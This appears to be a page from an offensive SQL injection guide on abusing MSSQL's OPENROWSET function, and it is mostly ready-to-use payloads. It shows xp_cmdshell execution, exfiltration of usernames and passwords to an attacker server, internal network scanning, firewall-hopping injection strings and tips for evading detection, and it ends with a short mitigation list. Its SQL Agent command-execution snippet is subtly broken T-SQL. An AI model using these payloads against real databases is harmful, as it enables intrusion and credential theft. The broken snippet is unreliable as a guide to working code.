---
title: OPENROWSET Attacks
description: Exploiting OPENROWSET functionality in MSSQL for advanced attacks
category: Advanced Techniques
order: 12
tags: ["openrowset", "linked servers", "data access"]
lastUpdated: 2025-03-15
---

## OPENROWSET Attacks

The `OPENROWSET` function in Microsoft SQL Server provides a way to access remote data from various data sources including other SQL Server instances, Excel files, and virtually any OLE DB provider. While intended for legitimate data integration, this functionality can be exploited in SQL injection attacks to access remote systems, exfiltrate data, or bypass security controls.

### OPENROWSET Basics

`OPENROWSET` allows ad-hoc connections to remote data sources:

```sql
SELECT * FROM OPENROWSET(
   'provider_name',
   'connection_string',
   'query or table'
)
```

Common providers:

- 'MSOLEDBSQL' (Microsoft OLE DB Driver for SQL Server — recommended for SQL Server 2017+)
- 'SQLNCLI' / 'SQLNCLI11' (SQL Server Native Client — deprecated, removed in SQL Server 2022)
- 'SQLOLEDB' (Legacy OLE DB Provider — deprecated since SQL Server 2012, retained for backward compatibility)
- 'Microsoft.ACE.OLEDB.12.0' (Access, Excel)
- 'MSDASQL' (ODBC)

### Prerequisites for Exploitation

OPENROWSET attacks typically require:

1. Ad hoc distributed queries must be enabled:

   ```sql
   EXEC sp_configure 'show advanced options', 1;
   RECONFIGURE;
   EXEC sp_configure 'ad hoc distributed queries', 1;
   RECONFIGURE;
   ```

2. Sufficient permissions (typically sysadmin or similar high privileges)
3. Appropriate network connectivity from the SQL Server to target systems

### Attack Techniques

#### Remote SQL Server Access

Connect to another SQL Server to access or exfiltrate data:

```sql
-- Basic connection to another SQL Server
SELECT * FROM OPENROWSET(
    'SQLNCLI',
    'Server=remote-server;Trusted_Connection=yes;',
    'SELECT @@version'
)

-- Using SQL authentication
SELECT * FROM OPENROWSET(
    'SQLNCLI',
    'Server=remote-server;uid=sa;pwd=password;',
    'SELECT * FROM master.sys.server_principals'
)
```

**Legacy Provider Note:** SQLOLEDB has been deprecated since SQL Server 2012 and receives no security updates or bug fixes. It remains available on Windows for backward compatibility but is unmaintained. For SQL Server 2019+, use **MSOLEDBSQL** (Microsoft OLE DB Driver) or modern ODBC drivers instead.

```sql
-- SQLOLEDB example (legacy/educational — no vendor support on current SQL Server versions)
SELECT * FROM OPENROWSET(
    'SQLOLEDB',
    'Server=127.0.0.1;uid=sa;pwd=p4ssw0rd;',
    'SET FMTONLY OFF execute master..xp_cmdshell "dir"'
);

-- Recommended: Use MSOLEDBSQL on SQL Server 2017+
SELECT * FROM OPENROWSET(
    'MSOLEDBSQL',
    'Server=127.0.0.1;uid=sa;pwd=p4ssw0rd;',
    'SET FMTONLY OFF execute master..xp_cmdshell "dir"'
);
```

#### File System Access

Read or write files using OPENROWSET with Excel or text providers:

```sql
-- Reading an Excel file
SELECT * FROM OPENROWSET(
    'Microsoft.ACE.OLEDB.12.0',
    'Excel 12.0;Database=C:\Data\file.xlsx;',
    'SELECT * FROM [Sheet1$]'
)

-- Reading a CSV file
SELECT * FROM OPENROWSET(
    'Microsoft.ACE.OLEDB.12.0',
    'Text;Database=C:\Data\;HDR=Yes;FORMAT=Delimited',
    'SELECT * FROM [file.csv]'
)
```

#### Network Scanning

OPENROWSET can be used for internal network scanning:

```sql
-- Testing if a server exists and accepts SQL connections
BEGIN TRY
    SELECT 1 FROM OPENROWSET('SQLNCLI', 'Server=192.168.1.10;uid=sa;pwd=test;', 'SELECT 1')
    SELECT 'Server is reachable'
END TRY
BEGIN CATCH
    SELECT 'Server is not reachable or credentials failed'
END CATCH
```

#### Data Exfiltration to Remote Servers

```sql
-- Exfiltrate data to another SQL Server
INSERT INTO OPENROWSET(
    'SQLNCLI',
    'Server=attacker-server;uid=sa;pwd=password;',
    'AttackerDB.dbo.StolenData'
)
SELECT username, password, email FROM users
```

#### Command Execution via SQL Server Agent

This technique combines OPENROWSET with SQL Server Agent to execute commands:

```sql
-- Create a job on a remote server to execute commands
DECLARE @job_name nvarchar(100) = 'remote_cmd'
EXEC OPENROWSET('SQLNCLI', 'Server=remote-server;uid=sa;pwd=password;',
'msdb.dbo.sp_add_job @job_name='''+@job_name+''', @enabled=1, @description=''Remote command execution''')

EXEC OPENROWSET('SQLNCLI', 'Server=remote-server;uid=sa;pwd=password;',
'msdb.dbo.sp_add_jobstep
    @job_name='''+@job_name+''',
    @step_name=''exec_cmd'',
    @subsystem=''CmdExec'',
    @command=''cmd.exe /c dir > c:\temp\output.txt'',
    @on_success_action=1')

EXEC OPENROWSET('SQLNCLI', 'Server=remote-server;uid=sa;pwd=password;',
'msdb.dbo.sp_start_job @job_name='''+@job_name+'''')
```

### Practical SQL Injection Examples

#### Basic OPENROWSET Injection

```sql
-- Injection in a vulnerable query
' UNION SELECT * FROM OPENROWSET('SQLNCLI', 'Server=attacker-server;uid=sa;pwd=password;', 'SELECT @@version')--
```

#### Nested OPENROWSET Attacks

```sql
-- Chain multiple OPENROWSET calls
' UNION SELECT * FROM OPENROWSET('SQLNCLI',
    'Server=server1;uid=sa;pwd=password;',
    'SELECT * FROM OPENROWSET(''SQLNCLI'',
        ''Server=server2;uid=sa;pwd=password;'',
        ''SELECT * FROM sensitive_table'')')--
```

#### Bypassing Network Restrictions

When direct connections are blocked by firewalls, OPENROWSET can be used to "hop" through servers:

```sql
-- Using an intermediary server to reach a blocked target
' UNION SELECT * FROM OPENROWSET('SQLNCLI',
    'Server=allowed-server;uid=sa;pwd=password;',
    'SELECT * FROM OPENROWSET(''SQLNCLI'',
        ''Server=blocked-server;uid=sa;pwd=password;'',
        ''SELECT * FROM sensitive_data'')')--
```

### Defense Evasion Techniques

#### Dynamic Construction to Avoid Detection

```sql
-- Using variables to avoid string detection
DECLARE @provider nvarchar(100) = 'SQLNCLI'
DECLARE @conn nvarchar(200) = 'Server=target;uid=sa;pwd=password;'
DECLARE @query nvarchar(100) = 'SELECT * FROM users'
EXEC('SELECT * FROM OPENROWSET(''' + @provider + ''', ''' + @conn + ''', ''' + @query + ''')')
```

#### Using Alternative Providers

```sql
-- Using less common providers
SELECT * FROM OPENROWSET('MSDASQL',
    'Driver={SQL Server};Server=target;uid=sa;pwd=password;',
    'SELECT @@version')
```

### Mitigations and Countermeasures

To prevent OPENROWSET attacks:

1. Disable ad hoc distributed queries if not needed:

   ```sql
   EXEC sp_configure 'ad hoc distributed queries', 0;
   RECONFIGURE;
   ```

2. Limit permissions on SQL Server providers:

   ```sql
   DENY EXECUTE ON sys.sp_addlinkedserver TO PUBLIC
   DENY EXECUTE ON sys.sp_addlinkedsrvlogin TO PUBLIC
   ```

3. Implement network segmentation to prevent SQL Server from connecting to unauthorized systems

4. Use parameterized queries and input validation in applications

5. Regularly audit and monitor for OPENROWSET usage:

   ```sql
   SELECT OBJECT_NAME(s.objectid) as ProcedureName,
       s.text
   FROM sys.dm_exec_cached_plans p
   CROSS APPLY sys.dm_exec_sql_text(p.plan_handle) s
   WHERE s.text LIKE '%OPENROWSET%'
   ```

### Limitations and Considerations

1. OPENROWSET requires specific server configurations and high privileges
2. Some providers may not be installed or available on all SQL Server instances
3. Network latency and connectivity can affect successful exploitation
4. The attack surface has been reduced in newer SQL Server versions through better defaults
5. Writing to remote systems usually requires additional permissions
